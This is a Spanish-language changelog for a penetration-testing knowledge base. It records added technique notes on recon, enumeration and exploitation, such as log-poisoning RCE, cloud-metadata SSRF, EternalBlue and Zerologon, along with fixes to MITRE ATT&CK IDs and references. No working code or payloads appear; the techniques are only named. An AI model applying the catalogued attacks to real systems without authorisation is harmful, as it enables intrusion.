    - `analisis-xss.md`: Añadidos contextos de inyección (HTML, Atributos, JS), DOM-Based XSS y técnicas de evasión de filtros.
    - `analisis-ssrf.md`: Añadida exfiltración de metadatos de Cloud (AWS, GCP, DigitalOcean) y bypasses de filtros de IP/DNS.
    - `analisis-sql-injection.md`: Añadidas metodologías para Blind SQLi (Boolean/Time-based) y lectura de archivos con `load_file`.
    - `analisis-lfi-rfi.md`: Añadidos vectores avanzados con PHP Wrappers y técnica de RCE vía Log Poisoning.

### Corregido
- **Estandarización**: Restaurada la consistencia en los campos `Fase`, `Plataforma` y `Dificultad` en las técnicas web enriquecidas para mantener la compatibilidad con el sistema de índices.

---

## [2026-03-23] — Sesión 3

### Añadido
- **Fase 02 - Enumeración Servicios** (3 técnicas nuevas): `enumeracion-ldap.md`, `enumeracion-smtp.md`, `enumeracion-oracle.md`.
- **Fase 02 - Enumeración Servicios** (9 técnicas nuevas): `enumeracion-postgresql.md`, `enumeracion-redis.md`, `enumeracion-vnc.md`, `enumeracion-telnet.md`, `enumeracion-mongodb.md`, `enumeracion-docker.md`, `enumeracion-kubernetes.md`, `enumeracion-elasticsearch.md`, `enumeracion-memcached.md`, `enumeracion-rabbitmq.md`.
- **Fase 02 - Enumeración Red** (2 técnicas nuevas): `enumeracion-kerberos.md`, `enumeracion-ipmi.md`.
- **Fase 03 - Análisis de Vulnerabilidades Scanning** (2 técnicas): `analisis-nmap-nse.md`, `escaneo-openvas-gvm.md`.
- **Fase 03 - Análisis de Vulnerabilidades Web** (6 técnicas): `analisis-sql-injection.md`, `analisis-xss.md`, `analisis-csrf.md`, `analisis-idor.md`, `analisis-lfi-rfi.md`, `analisis-seguridad-cabeceras.md`.
- **Fase 03 - Análisis de Vulnerabilidades Sistema** (4 técnicas): `analisis-parches-windows.md`, `analisis-permisos-linux.md`, `analisis-servicios-mal-configurados.md`, `analisis-software-obsoleto.md`.
- **Fase 03 - Análisis de Vulnerabilidades Web** (8 técnicas adicionales): `analisis-cors.md`, `analisis-ssrf.md`, `analisis-ssti.md`, `analisis-command-injection.md`, `analisis-xxe.md`, `analisis-deserialization.md`, `analisis-open-redirect.md`, `analisis-nessus.md`.
- **Fase 04 - Explotación Web** (7 técnicas): `explotacion-sqli.md`, `explotacion-nosqli.md`, `explotacion-deserialization.md`, `explotacion-fileupload.md`, `explotacion-jwt.md`, `explotacion-auth-bypass-oauth.md`, `explotacion-cms-wordpress.md`.
- **Fase 04 - Explotación Red** (5 técnicas): `explotacion-arp-spoofing.md`, `explotacion-mitm-responder.md`, `explotacion-mitm6.md`, `explotacion-smb-relay.md`, `explotacion-adcs-relay.md`.
- **Fase 04 - Explotación Sistema** (6 técnicas): `explotacion-buffer-overflow-stack.md`, `explotacion-eternalblue.md`, `explotacion-shellshock.md`, `explotacion-zerologon.md`, `explotacion-kernel-linux.md`, `explotacion-kernel-windows.md`.
- **Fase 04 - Explotación Client-Side** (3 técnicas): `explotacion-msfvenom.md`, `explotacion-phishing-tecnico.md`, `explotacion-process-injection.md`.
- **Fase 04 - Explotación Credenciales** (3 técnicas): `explotacion-hash-cracking.md`, `explotacion-brute-force-advanced.md`, `explotacion-password-spraying.md`.
- **Template**: Creado `inventario/TEMPLATE.md` con estructura exacta, ejemplos de formato y notas para el redactor en comentario HTML.
- **Idioma y Ortografía**: Añadida sección en `AGENTS.md` requiriendo acentos y ortografía correcta en español.
- **Referencia al Template**: Actualizado `AGENTS.md` para apuntar a `inventario/TEMPLATE.md` como lectura obligatoria antes de crear archivos.

### Corregido (Fase 02 — post-review de 12 archivos nuevos)
- **MITRE ATT&CK IDs**: Corregidos 8 IDs incorrectos: redis/mongodb/elasticsearch/memcached T1595→T1046, telnet/ipmi/docker T1021.002→T1046, postgresql T1210→T1046. Añadidos T1558.003 y T1558.004 a kerberos.
- **Dificultad no estándar**: Corregidos 6 archivos: kerberos/ipmi/docker "Media"→"Intermedia", postgresql "Básica/Media"→"Intermedia", telnet "Muy Básica"→"Básica", kubernetes "Media/Alta"→"Avanzada".
- **Plataforma no estándar**: Corregidos 7 archivos que usaban listas o paréntesis ("Linux, Windows", "Hardware (...)") → "Multi".
- **Referencias faltantes**: Añadidas citas a libros de `referencias/` en los 12 archivos (Allen 2022, Harper et al. 2018).
- **VNC hashcat**: Corregido modo -m 3000 (LM hash) → uso de `vncpwd` para descifrado de contraseñas VNC.

### Corregido (Fase 03 — post-review de 12 archivos iniciales)
- **Campo Fase faltante**: Añadido `- **Fase**: Análisis de Vulnerabilidades` a los 12 archivos.
- **Orden de Clasificación**: Corregido de Dificultad→Plataforma→MITRE a Fase→MITRE→Plataforma→Dificultad en 12 archivos.
- **Formato de dos puntos**: Corregido `**Campo:**` → `**Campo**:` en 12 archivos.
- **Herramientas sin formato**: Añadido bold, módulos entre paréntesis y descripción con guión largo en 12 archivos.
- **MITRE ATT&CK IDs**: analisis-csrf T1595→T1185, analisis-idor T1595→T1213, analisis-seguridad-cabeceras T1595→T1595.002, analisis-servicios-mal-configurados T1068→T1078.
- **Autor incorrecto**: escaneo-openvas-gvm.md Velu V. (2017)→Allen M. (2022) para Mastering Kali Linux.

---

## [2026-03-23] — Sesión 2

### Añadido
- **Fase 02 - Enumeracion Web** (5 tecnicas): `fingerprinting-tecnologias-web.md`, `enumeracion-http-nmap.md`, `enumeracion-webdav.md`, `nikto.md`, `banner-grabbing-http.md`.
- **Fase 02 - Enumeracion Red** (4 tecnicas): `enumeracion-smb.md`, `enumeracion-snmp.md`, `enumeracion-nfs.md`, `enumeracion-dns.md`.
- **Fase 02 - Enumeracion Servicios** (6 tecnicas): `enumeracion-ssh.md`, `enumeracion-ftp.md`, `enumeracion-mysql.md`, `enumeracion-mssql.md`, `enumeracion-rdp.md`, `enumeracion-winrm.md`.
- **Fase 02 - Fuzzing** (4 tecnicas): `fuzzing-directorios-archivos.md`, `fuzzing-subdominios-vhosts.md`, `fuzzing-parametros.md`, `fuzzing-lfi-ssrf.md`.

### Corregido (Fase 02 — post-review)
- **MITRE IDs fuzzing**: `fuzzing-directorios-archivos.md` y `fuzzing-lfi-ssrf.md` T1083→T1595.002 (T1083 es post-compromiso local, no fuzzing HTTP externo).
- **MITRE IDs fuzzing**: `fuzzing-subdominios-vhosts.md` T1595.001→T1595.002 (T1595.001 modela IP block scanning, no subdomain enum).
- **MITRE IDs enumeracion**: `enumeracion-webdav.md` añadido T1190; `enumeracion-nfs.md` añadido T1548.001; `enumeracion-smb.md` expandido a T1087+T1069+T1007+T1110.
- **MITRE IDs servicios**: `enumeracion-ssh.md` y `enumeracion-ftp.md` corregidos — ID principal ahora T1046 (enumeracion), T1110.001 como secundario (fuerza bruta).
- **Herramienta deprecada**: `enumeracion-winrm.md` — reemplazado CrackMapExec (archivado 2024) por NetExec (`nxc`).
- **Referencias invalidas**: Reemplazado `Engebretson (2013)` en `nikto.md` y `enumeracion-ftp.md` (libro no disponible en `referencias/`) por `Gray Hat Hacking`.
- **Autoria incorrecta**: Corregido `Metasploit for Beginners` en `enumeracion-mysql.md` y `enumeracion-mssql.md` → autor correcto: Rahalkar, S. (2017).

---

## [2026-03-23] — Sesion 1

### Añadido
- **Fuentes de Internet**: Agregadas 30+ fuentes organizadas en 7 categorías al `AGENTS.md` (MITRE ATT&CK, OWASP, NVD, Exploit-DB, HackTricks, GTFOBins, LOLBAS, PTES, OSSTMM, NIST, etc.).
- **Fase 01 - Reconocimiento Pasivo** (8 técnicas): `google-dorking.md`, `shodan-censys.md`, `transparencia-certificados.md`, `dns-pasivo.md`, `fingerprinting-tecnologias-web.md`, `recoleccion-emails.md`, `wayback-machine.md`, `whois-registros-dominio.md`.
- **Fase 01 - Reconocimiento Activo** (6 técnicas): `descubrimiento-hosts.md`, `escaneo-puertos.md`, `fingerprinting-os-servicios.md`, `enumeracion-dns.md`, `escaneo-vulnerabilidades.md`, `deteccion-waf.md`.
- **Formato de Referencias APA**: Definida guía de formato APA 7ma edición en `AGENTS.md` con ejemplos para libros, frameworks online, herramientas/repos y notas del proyecto.

### Corregido
- **MITRE ATT&CK IDs**: Corregidos 4 IDs incorrectos (`deteccion-waf.md` T1595.001→T1595, `fingerprinting-tecnologias-web.md` T1592.004→T1592.002, `fingerprinting-os-servicios.md` T1592.001→T1592.002, `wayback-machine.md` T1593.002→T1593).
- **Clasificación**: Movido `deteccion-waf.md` de `pasivo/` a `activo/` (WAF detection requiere interacción con el target).
- **Info desactualizada**: Removida cookie `__cfduid` (deprecada por Cloudflare 2021), reemplazado `amap` (abandonado) por `nmap -sV --version-all`, corregida sintaxis de `retire.js`.
- **Comando redundante**: Corregido `-f --mtu 16` → `--mtu 16` en `descubrimiento-hosts.md`.
- **Warning faltante**: Agregada advertencia en `nmap --script exploit` (`escaneo-vulnerabilidades.md`).
- **Plataforma**: Corregido `dns-pasivo.md` de "Web" a "Multi".
- **Formato revisor**: Restaurado formato `**Herramientas**`/`**Instrucciones**` en `AGENTS.md`.

### Actualizado
- **Referencias a formato APA**: Las 14 técnicas de Fase 01 actualizadas a formato APA 7ma edición con datos reales de autores, editoriales y años.
- **Referencias a libros**: Incorporadas referencias a libros de `referencias/` en todas las técnicas (previamente solo referenciaban notas y MITRE).

## [2026-03-22]

### Añadido
- **Estructura del Inventario**: Creada la jerarquía de directorios completa (01-08) según la taxonomía definida en `AGENTS.md`.
- **Carpeta de Redundancia**: Creado el directorio `redundancia/` para almacenar versiones descartadas o duplicadas de notas de forma segura sin pérdida de información.
- **Herramienta de Diagnóstico**: Creado `compare_notes.py` para detectar inconsistencias entre `notas/` (HTML) y `notas-md/` (Markdown).
- **Heurísticas de Prioridad**: Actualizado `AGENTS.md` con reglas claras para la resolución de conflictos (Prioridad 1: Oficial, 2: Libros, 3: Notas personales).

### Analizado
- **Inconsistencias de Nombres**: Identificados archivos HTML con dobles espacios antes del hash, lo que causaba desajustes en la normalización.
- **Detección de Duplicados**: Identificada una nota redundante en `notas/` con dos versiones distintas (18K vs 19K): `DOM XSS in document write sink using source locati`.
